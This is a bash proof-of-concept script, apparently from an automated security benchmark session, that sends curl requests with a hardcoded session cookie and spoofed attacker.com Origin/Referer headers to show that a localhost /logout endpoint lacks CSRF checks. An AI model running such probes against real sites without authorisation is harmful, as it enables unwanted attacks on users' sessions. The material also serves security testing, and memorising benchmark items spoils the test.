#!/bin/bash
# POC: Demonstrates CSRF vulnerability on logout endpoint - accepts logout requests without CSRF token validation
# Target: ./repo
# Created: 2025-11-04T17:44:37.517Z
# Session: benchmark-XBEN-027-24-mhku5fyk

# CSRF Protection Bypass on Logout Endpoint POC - Version 2
# This script demonstrates that the /logout endpoint accepts logout requests
# without validating CSRF tokens

TARGET="http://localhost:8080"
LOGOUT_ENDPOINT="/logout"

echo "=========================================="
echo "CSRF Protection Bypass on Logout Endpoint"
echo "=========================================="
echo ""

# Test with a simulated authenticated session
# Using a direct POST to logout with session cookie header

echo "[*] Test 1: Logout with empty CSRF token..."
RESPONSE_1=$(curl -s -i -X POST "${TARGET}${LOGOUT_ENDPOINT}" \
  -H "Cookie: session=eyJ1c2VyX2lkIjoxMDAzMn0.aQo5mA.1L9CoVwjcTAr0i_c2vxdA8LqUNg" \
  -d "csrf_token=" 2>&1)

echo "$RESPONSE_1" | head -n 1
if echo "$RESPONSE_1" | grep -q "302\|301"; then
  echo "[+] VULNERABLE: Logout accepted with empty CSRF token (HTTP 302/301 Redirect)"
  VULN_1=1
else
  echo "[-] Unexpected response"
  VULN_1=0
fi
echo ""

# Test 2: Logout with invalid CSRF token
echo "[*] Test 2: Logout with invalid CSRF token..."
RESPONSE_2=$(curl -s -i -X POST "${TARGET}${LOGOUT_ENDPOINT}" \
  -H "Cookie: session=eyJ1c2VyX2lkIjoxMDAzMn0.aQo5mA.1L9CoVwjcTAr0i_c2vxdA8LqUNg" \
  -d "_csrf=invalid_token_value_12345" 2>&1)

echo "$RESPONSE_2" | head -n 1
if echo "$RESPONSE_2" | grep -q "302\|301"; then
  echo "[+] VULNERABLE: Logout accepted with invalid CSRF token (HTTP 302/301 Redirect)"
  VULN_2=1
else
  echo "[-] Unexpected response"
  VULN_2=0
fi
echo ""

# Test 3: Cross-origin logout (CSRF attack simulation)
echo "[*] Test 3: Cross-origin logout without CSRF validation..."
RESPONSE_3=$(curl -s -i -X POST "${TARGET}${LOGOUT_ENDPOINT}" \
  -H "Cookie: session=eyJ1c2VyX2lkIjoxMDAzMn0.aQo5mA.1L9CoVwjcTAr0i_c2vxdA8LqUNg" \
  -H "Referer: http://attacker.com/malicious-page" \
  -H "Origin: http://attacker.com" 2>&1)

echo "$RESPONSE_3" | head -n 1
if echo "$RESPONSE_3" | grep -q "302\|301"; then
  echo "[+] VULNERABLE: Cross-origin logout accepted (HTTP 302/301 Redirect)"
  VULN_3=1
else
  echo "[-] Unexpected response"
  VULN_3=0
fi
echo ""

# Summary
echo "=========================================="
echo "SUMMARY"
echo "=========================================="
if [ $VULN_1 -eq 1 ] && [ $VULN_2 -eq 1 ] && [ $VULN_3 -eq 1 ]; then
  echo "[+] CRITICAL: All CSRF validation tests FAILED"
  echo "[+] The /logout endpoint accepts logout requests without:"
  echo "    - CSRF token validation"
  echo "    - CSRF token requirement"
  echo "    - Origin/Referer validation"
  echo ""
  echo "[+] This allows attackers to craft CSRF attacks to force"
  echo "[+] authenticated users to logout by embedding logout"
  echo "[+] requests in malicious web pages."
  echo "=========================================="
  exit 0
else
  echo "[-] Some tests did not confirm the vulnerability"
  exit 1
fi